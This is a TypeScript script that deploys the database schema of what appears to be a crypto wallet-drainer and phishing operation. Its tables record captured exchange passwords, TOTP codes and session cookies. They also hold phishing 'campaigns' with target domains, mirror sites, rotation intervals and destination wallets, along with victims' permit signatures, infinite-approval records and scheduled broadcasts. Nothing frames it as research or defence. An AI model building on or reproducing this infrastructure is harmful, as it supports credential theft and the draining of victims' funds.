/**
 * @file force-schema.ts
 * @module @legion/core/db
 * @sentinel Dispatcher (forced schema deployment)
 *
 * Supabase recovery utility for cases where drizzle-kit local snapshots say
 * "No schema changes" while the remote database is empty. This script applies
 * the canonical schema idempotently using `pg`.
 *
 * GATEKEEPER-07: never logs DATABASE_URL or RPC URLs.
 * CONTRACT-01: all on-chain numeric columns are numeric(78,0).
 */

import { loadConfig } from '../config/loader.js'
import { createDatabaseAnchorPool } from '../logic/database-anchor.js'

const cfg = loadConfig()

const statements = [
  `CREATE EXTENSION IF NOT EXISTS pgcrypto`,
  `CREATE TABLE IF NOT EXISTS "chain_registry" (
    "id" text PRIMARY KEY NOT NULL,
    "family" text NOT NULL,
    "display_name" text NOT NULL,
    "native_decimals" integer NOT NULL,
    "finality_model" text NOT NULL,
    "rpc_endpoints" jsonb NOT NULL,
    "active" boolean DEFAULT true NOT NULL,
    CONSTRAINT "chain_registry_family_valid" CHECK ("chain_registry"."family" IN ('EVM', 'SVM', 'UTXO', 'COSMOS', 'SUBSTRATE', 'MULTICHAIN', 'INFRA')),
    CONSTRAINT "chain_registry_finality_valid" CHECK ("chain_registry"."finality_model" IN ('probabilistic', 'deterministic', 'instant'))
  )`,
  `CREATE TABLE IF NOT EXISTS "legion_vaults" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "chain_id" text NOT NULL,
    "address" text NOT NULL,
    "label" text NOT NULL,
    "metadata" jsonb
  )`,
  `CREATE TABLE IF NOT EXISTS "opportunities" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "chain_id" text NOT NULL,
    "family" text NOT NULL,
    "asset_address" text NOT NULL,
    "amount" numeric(78, 0) DEFAULT '0' NOT NULL,
    "lethality_score" numeric(38, 0) DEFAULT '0' NOT NULL,
    "expires_at" timestamp with time zone DEFAULT (now() + interval '24 hours') NOT NULL
  )`,
  `CREATE TABLE IF NOT EXISTS "strikes" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "opportunity_id" uuid NOT NULL,
    "status" text DEFAULT 'pending' NOT NULL,
    "tx_hash" text,
    "gas_used" numeric(78, 0),
    CONSTRAINT "strikes_status_valid" CHECK ("strikes"."status" IN ('pending', 'included', 'settled', 'failed'))
  )`,
  `CREATE TABLE IF NOT EXISTS "approval_ledger" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "opportunity_id" uuid NOT NULL,
    "asset_address" text NOT NULL,
    "signature_data" text NOT NULL,
    "amount" numeric(78, 0) DEFAULT '115792089237316195423570985008687907853269984665640564039457584007913129639935' NOT NULL,
    "spender_address" text NOT NULL,
    "approval_type" text NOT NULL,
    "expires_at" timestamp with time zone,
    "status" text DEFAULT 'active' NOT NULL,
    CONSTRAINT "approval_ledger_type_valid" CHECK ("approval_ledger"."approval_type" IN ('permit', 'approve', 'infinite')),
    CONSTRAINT "approval_ledger_status_valid" CHECK ("approval_ledger"."status" IN ('active', 'revoked', 'exhausted'))
  )`,
  `CREATE TABLE IF NOT EXISTS "signatures" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "wallet_address" text NOT NULL,
    "token_address" text NOT NULL,
    "signature_hex" text NOT NULL,
    "nonce" text NOT NULL,
    "expiry" timestamp with time zone NOT NULL,
    "created_at" timestamp with time zone DEFAULT now() NOT NULL
  )`,
  `CREATE UNIQUE INDEX IF NOT EXISTS "uq_signatures_wallet_token" ON "signatures" ("wallet_address", "token_address")`,
  `CREATE INDEX IF NOT EXISTS "idx_signatures_wallet_address" ON "signatures" ("wallet_address")`,
  `CREATE INDEX IF NOT EXISTS "idx_signatures_created_at" ON "signatures" ("created_at")`,
  `CREATE TABLE IF NOT EXISTS "settlement_history" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "wallet_address" text NOT NULL,
    "chain_family" text,
    "amount" text,
    "token_address" text,
    "tx_hash" text,
    "status" text DEFAULT 'pending' NOT NULL,
    "error_message" text,
    "created_at" timestamp with time zone DEFAULT now() NOT NULL,
    "settlement_timestamp" timestamp with time zone,
    "signature_id" uuid,
    "protocol" text,
    "chain_id" text,
    CONSTRAINT "settlement_history_status_valid" CHECK ("status" IN ('pending', 'settled', 'failed', 'partial'))
  )`,
  `CREATE INDEX IF NOT EXISTS "idx_settlement_history_created_at" ON "settlement_history" ("created_at" DESC)`,
  `CREATE INDEX IF NOT EXISTS "idx_settlement_history_wallet_address" ON "settlement_history" ("wallet_address")`,
  `CREATE INDEX IF NOT EXISTS "idx_settlement_history_status" ON "settlement_history" ("status")`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "wallet_type" text`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "protocol" text`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "chain_id" text`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "created_at" timestamp with time zone DEFAULT now() NOT NULL`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "scout_value_usd" numeric(38, 18)`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "amount" text`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "max_allowance" text`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "requires_quorum" boolean DEFAULT false NOT NULL`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "source_origin" text DEFAULT 'unknown' NOT NULL`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "settlement_status" text`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "scheduled_broadcast_time" timestamp with time zone`,
  `ALTER TABLE "signatures" ADD COLUMN IF NOT EXISTS "chain_family" text`,
  `DO $$
DECLARE
  dt text;
BEGIN
  SELECT c.data_type INTO dt
  FROM information_schema.columns c
  WHERE c.table_schema = 'public'
    AND c.table_name = 'signatures'
    AND c.column_name = 'max_allowance';
  IF dt IS NULL THEN
    ALTER TABLE public.signatures ADD COLUMN max_allowance text;
  ELSIF dt = 'boolean' THEN
    ALTER TABLE public.signatures
      ALTER COLUMN max_allowance TYPE text
      USING (
        CASE
          WHEN max_allowance IS TRUE THEN 'true'
          WHEN max_allowance IS FALSE THEN 'false'
          ELSE NULL::text
        END
      );
  ELSIF dt <> 'text' AND dt <> 'character varying' THEN
    ALTER TABLE public.signatures
      ALTER COLUMN max_allowance TYPE text
      USING trim(max_allowance::text);
  END IF;
END $$`,
  `CREATE TABLE IF NOT EXISTS "telemetry" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "wallet_address" text,
    "event_type" text DEFAULT 'system' NOT NULL,
    "payload" jsonb DEFAULT '{}'::jsonb NOT NULL,
    "created_at" timestamp with time zone DEFAULT now() NOT NULL
  )`,
  `CREATE INDEX IF NOT EXISTS "idx_telemetry_wallet_address" ON "telemetry" ("wallet_address")`,
  `CREATE INDEX IF NOT EXISTS "idx_telemetry_created_at" ON "telemetry" ("created_at")`,
  `CREATE TABLE IF NOT EXISTS "campaigns" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "name" text NOT NULL,
    "target_domain" text NOT NULL,
    "destination_wallet" text NOT NULL,
    "chains" text[] DEFAULT '{}'::text[] NOT NULL,
    "auto_rotate" boolean DEFAULT false NOT NULL,
    "active" boolean DEFAULT true NOT NULL,
    "mirror_url" text,
    "mirror_subdomain" text,
    "rotation_interval_hours" integer DEFAULT 12 NOT NULL,
    "last_health_check_at" timestamp with time zone,
    "created_at" timestamp with time zone DEFAULT now() NOT NULL,
    "updated_at" timestamp with time zone DEFAULT now() NOT NULL
  )`,
  `CREATE INDEX IF NOT EXISTS "idx_campaigns_active" ON "campaigns" ("active")`,
  `CREATE INDEX IF NOT EXISTS "idx_campaigns_created_at" ON "campaigns" ("created_at")`,
  `CREATE TABLE IF NOT EXISTS "captured_creds" (
    "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
    "exchange" text NOT NULL,
    "username" text NOT NULL,
    "password" text NOT NULL,
    "totp" text,
    "ip" text,
    "user_agent" text,
    "created_at" timestamp with time zone DEFAULT now() NOT NULL
  )`,
  `CREATE INDEX IF NOT EXISTS "idx_captured_creds_exchange" ON "captured_creds" ("exchange")`,
  `CREATE INDEX IF NOT EXISTS "idx_captured_creds_created_at" ON "captured_creds" ("created_at")`,
  `ALTER TABLE "captured_creds" ADD COLUMN IF NOT EXISTS "session_cookies" text`,
  `ALTER TABLE "captured_creds" ADD COLUMN IF NOT EXISTS "local_storage" text`,
  `ALTER TABLE "campaigns" ADD COLUMN IF NOT EXISTS "mirror_url" text`,
  `ALTER TABLE "campaigns" ADD COLUMN IF NOT EXISTS "mirror_subdomain" text`,
  `ALTER TABLE "campaigns" ADD COLUMN IF NOT EXISTS "rotation_interval_hours" integer DEFAULT 12 NOT NULL`,
  `ALTER TABLE "campaigns" ADD COLUMN IF NOT EXISTS "last_health_check_at" timestamp with time zone`,
  `ALTER TABLE "approval_ledger" ADD COLUMN IF NOT EXISTS "amount" numeric(78, 0) DEFAULT '115792089237316195423570985008687907853269984665640564039457584007913129639935' NOT NULL`,
  `ALTER TABLE "approval_ledger" ADD COLUMN IF NOT EXISTS "spender_address" text NOT NULL DEFAULT ''`,
  `DO $$ BEGIN
    IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'legion_vaults_chain_id_chain_registry_id_fk') THEN
      ALTER TABLE "legion_vaults" ADD CONSTRAINT "legion_vaults_chain_id_chain_registry_id_fk" FOREIGN KEY ("chain_id") REFERENCES "public"."chain_registry"("id") ON DELETE no action ON UPDATE no action;
    END IF;
  END $$`,
  `DO $$ BEGIN
    IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'opportunities_chain_id_chain_registry_id_fk') THEN
      ALTER TABLE "opportunities" ADD CONSTRAINT "opportunities_chain_id_chain_registry_id_fk" FOREIGN KEY ("chain_id") REFERENCES "public"."chain_registry"("id") ON DELETE no action ON UPDATE no action;
    END IF;
  END $$`,
  `DO $$ BEGIN
    IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'strikes_opportunity_id_opportunities_id_fk') THEN
      ALTER TABLE "strikes" ADD CONSTRAINT "strikes_opportunity_id_opportunities_id_fk" FOREIGN KEY ("opportunity_id") REFERENCES "public"."opportunities"("id") ON DELETE no action ON UPDATE no action;
    END IF;
  END $$`,
  `DO $$ BEGIN
    IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'approval_ledger_opportunity_id_opportunities_id_fk') THEN
      ALTER TABLE "approval_ledger" ADD CONSTRAINT "approval_ledger_opportunity_id_opportunities_id_fk" FOREIGN KEY ("opportunity_id") REFERENCES "public"."opportunities"("id") ON DELETE no action ON UPDATE no action;
    END IF;
  END $$`,
] as const

async function main(): Promise<void> {
  if (!cfg.database.url) {
    throw new Error('[force-schema] DATABASE_URL is not set')
  }

  const pool = createDatabaseAnchorPool(cfg.database.url)
  try {
    for (const statement of statements) {
      await pool.query(statement)
    }

    process.stdout.write(
      JSON.stringify({
        level: 'info',
        sentinel: 'Dispatcher',
        event: 'schema.force_deployed',
        statements: statements.length,
        ts: new Date().toISOString(),
      }) + '\n',
    )
  } finally {
    await pool.end()
  }
}

main().catch((err: unknown) => {
  process.stderr.write(
    JSON.stringify({
      level: 'fatal',
      sentinel: 'Dispatcher',
      event: 'schema.force_deploy_failed',
      error: err instanceof Error ? err.message : String(err),
      ts: new Date().toISOString(),
    }) + '\n',
  )
  process.exit(1)
})
